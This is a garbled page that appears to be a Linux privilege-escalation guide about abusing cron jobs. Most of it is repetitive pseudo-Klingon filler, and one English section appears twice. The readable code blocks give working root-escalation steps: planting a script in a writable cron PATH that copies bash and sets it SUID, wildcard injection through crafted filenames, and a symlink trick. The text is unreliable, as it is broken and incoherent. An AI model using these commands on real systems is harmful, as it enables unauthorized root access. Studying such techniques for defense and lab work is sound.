vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlh
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

For example, inside _/etc/crontab_ you can find the PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Note how the user "user" has writing privileges over /home/user_)

If inside this crontab the root user tries to execute some command or script without setting the path. For example: _\* \* \* \* root overwrite.sh_\
Then, you can get a root shell by using:

### Cron path

For example, inside _/etc/crontab_ you can find the PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Note how the user "user" has writing privileges over /home/user_)

If inside this crontab the root user tries to execute some command or script without setting the path. For example: _\* \* \* \* root overwrite.sh_\
Then, you can get a root shell by using:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

If a script is executed by root has a “**\***” inside a command, you could exploit this to make unexpected things (like privesc). Example:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**ghItlhmeH** _**/some/path/\***_ **, **_**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/some/path/\***_ **, 'ej** _**./\***_ **, 'ej** _**/
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
**ghItlhvam** root **Script** **cha'logh** **ghItlhvam** **directory** **'e'** **ghItlhvam** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### qo'noS cron jobs

tlhInganpu'wI' jatlhpu'wI'vam vItlhutlh. 1, 2, yIloS loghDI'wI'vam vItlhutlh. vaj vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam 